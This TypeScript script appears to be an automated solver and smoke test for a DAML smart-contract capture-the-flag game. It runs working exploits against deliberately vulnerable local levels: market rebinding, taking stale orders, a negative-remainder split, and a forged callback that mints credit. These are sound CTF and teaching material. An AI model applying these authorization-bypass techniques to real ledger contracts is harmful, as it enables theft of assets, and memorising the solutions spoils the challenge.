// Headless player: solves Level 0 and Level 1 against a local sandbox + backend
// using the same JSON Ledger API v2 calls the wallet would sign. Used for the
// demo video and as an end-to-end smoke test:  npx tsx scripts/demo-solve.mts
import { JsonApiClient } from '../shared/jsonLedgerApi.js';
import { DAMLNAUT_USER_ID, templateId } from '../shared/damlnaut.js';

const API = process.env.DAML_JSON_API_URL ?? 'http://localhost:7575';
const BACKEND = process.env.BACKEND_URL ?? 'http://localhost:8787';
// In a multi-participant setup the player lives on PLAYER_JSON_API_URL (participant2).
const PLAYER_API = process.env.PLAYER_JSON_API_URL ?? API;
const c = new JsonApiClient({ baseUrl: PLAYER_API });
const step = (m: string) => console.log(`\n\x1b[36m▶ ${m}\x1b[0m`);
const post = async (p: string, body: unknown) =>
  (await fetch(`${BACKEND}${p}`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) })).json() as Promise<any>;

const health = await (await fetch(`${BACKEND}/api/health`)).json() as any;
const issuer: string = health.issuer;
step(`backend ready, issuer = ${issuer.slice(0, 28)}…  player participant = ${PLAYER_API}`);

const sync = (await c.connectedSynchronizers()).connectedSynchronizers[0].synchronizerId;
const hint = `damlnaut-player-${Date.now().toString(36)}`;
const player = (await c.allocateParty({ partyIdHint: hint, synchronizerId: sync })).partyDetails.party;
step(`allocated player ${player.slice(0, 32)}…`);
const run = (id: string, commands: any[]) =>
  c.submitAndWait({ userId: DAMLNAUT_USER_ID, commandId: `${id}-${Date.now()}`, actAs: [player], commands });
const mine = async () => (await c.activeContractsFor(player)).filter((e) => (e.createArgument as any).player === player || (e.createArgument as any).solver === player);

// ---- Level 0 ----
step('LEVEL 0 — create instance, exercise SubmitLevel0');
const L0 = templateId('Damlnaut.Level0', 'Level0Instance');
await run('l0-create', [{ CreateCommand: { templateId: L0, createArguments: { player, issuer, instanceId: 'demo-l0', instructions: 'submit' } } }]);
const inst = (await mine()).find((e) => e.templateId.includes('Level0Instance'))!;
await run('l0-submit', [{ ExerciseCommand: { templateId: L0, contractId: inst.contractId, choice: 'SubmitLevel0', choiceArgument: {} } }]);
const v0 = await post('/api/levels/0/verify', { party: player });
console.log('  verified:', v0.verified, '→', v0.flag?.payload?.flagValue ?? v0.message);

// ---- Level 1 ----
step('LEVEL 1 — Market rebinding (Settle never checks marketCid == market)');
const b = await post('/api/levels/1/bootstrap', { party: player });
const alpha = b.markets.find((m: any) => m.payload.symbol === 'ALPHA');
const beta = b.markets.find((m: any) => m.payload.symbol === 'BETA');
console.log(`  Position is bound to ALPHA; we will settle against BETA (${beta.payload.price})`);
const P1 = templateId('Damlnaut.Level1', 'Position');
let pos = b.position;
if (!pos) {
  await run('l1-open', [{ CreateCommand: { templateId: P1, createArguments: { player, curator: issuer, market: alpha.contractId, size: '1.0', instanceId: 'demo-l1' } } }]);
  pos = (await mine()).find((e) => e.templateId.includes('Position'));
}
await run('l1-settle', [{ ExerciseCommand: { templateId: P1, contractId: pos.contractId, choice: 'Settle', choiceArgument: { marketCid: beta.contractId } } }]);
const v1 = await post('/api/levels/1/verify', { party: player });
console.log('  verified:', v1.verified, '→', v1.flag?.payload?.flagValue ?? v1.message);
// ---- Levels 2-4: control first (must not win), then the exploit ----
const exercise = (id: string, c0: { templateId: string; contractId: string }, choice: string, choiceArgument: unknown) =>
  run(id, [{ ExerciseCommand: { templateId: c0.templateId, contractId: c0.contractId, choice, choiceArgument } }]);
const boot = async (n: number) => (await post(`/api/levels/${n}/bootstrap`, { party: player })).contracts as any[];
const verify = (n: number) => post(`/api/levels/${n}/verify`, { party: player });
const ofTemplate = (cs: any[], ent: string) => cs.filter((x) => x.templateId.endsWith(`:${ent}`));

step('LEVEL 2 — Stale Order (Take never checks expiresAt)');
let orders = ofTemplate(await boot(2), 'Order');
const live = orders.find((o) => o.payload.label === 'LIVE-105');
await exercise('l2-take-live', live, 'Take', {});
const v2c = await verify(2);
console.log('  control (live order) verified:', v2c.verified, '→', v2c.proof?.payload?.proof);
orders = ofTemplate(await boot(2), 'Order');
const stale = orders.find((o) => o.payload.label === 'STALE-80');
await exercise('l2-take-stale', stale, 'Take', {});
const v2 = await verify(2);
console.log('  exploit (expired order) verified:', v2.verified, '→', v2.flag?.payload?.value ?? v2.message);

step('LEVEL 3 — Negative Remainder (Split has no positive-amount check)');
let l3 = await boot(3);
const vault = ofTemplate(l3, 'PrizeVault')[0];
const holding = ofTemplate(l3, 'Holding')[0];
await exercise('l3-buy-honest', vault, 'Buy', { holdingCid: holding.contractId });
const v3c = await verify(3);
console.log('  control (100.0 holding) verified:', v3c.verified, '→', v3c.proof?.payload?.proof);
await exercise('l3-split', holding, 'Split', { splitAmount: '250.0' });
l3 = await boot(3);
const amounts = ofTemplate(l3, 'Holding').map((h) => h.payload.amount);
console.log('  holdings after split:', amounts.join(', '));
const big = ofTemplate(l3, 'Holding').find((h) => Number(h.payload.amount) >= 250);
await exercise('l3-buy', vault, 'Buy', { holdingCid: big.contractId });
const v3 = await verify(3);
console.log('  exploit (250.0 holding) verified:', v3.verified, '→', v3.flag?.payload?.value ?? v3.message);

step('LEVEL 4 — Forged Callback (Deliver runs any callback with the curator’s authority)');
const gateway = ofTemplate(await boot(4), 'Gateway')[0];
const message = (callback: unknown) => ({ message: { source: 'ethereum', payload: 'transfer 10 to bob', callback } });
await exercise('l4-receipt', gateway, 'Deliver', message({ tag: 'LogReceipt', value: {} }));
const v4c = await verify(4);
console.log('  control (LogReceipt) verified:', v4c.verified, '→', v4c.proof?.payload?.proof);
await exercise('l4-mint', gateway, 'Deliver', message({ tag: 'MintCredit', value: '1000.0' }));
const v4 = await verify(4);
console.log('  exploit (MintCredit) verified:', v4.verified, '→', v4.flag?.payload?.value ?? v4.message);
const credits = ofTemplate(await boot(4), 'Credit').map((x) => `${x.payload.amount} signed by ${x.payload.curator.slice(0, 16)}…`);
console.log('  credits held by the relayer:', credits.join('; '));

const controlsHeld = !v2c.verified && !v3c.verified && !v4c.verified;
const allSolved = v0.verified && v1.verified && v2.verified && v3.verified && v4.verified;
if (!controlsHeld || !allSolved) {
  console.log('\n\x1b[31m✘ controls held:', controlsHeld, '· all solved:', allSolved, '\x1b[0m');
  process.exit(1);
}
console.log('\n\x1b[32m✔ all five flags captured; every control case was rejected\x1b[0m');
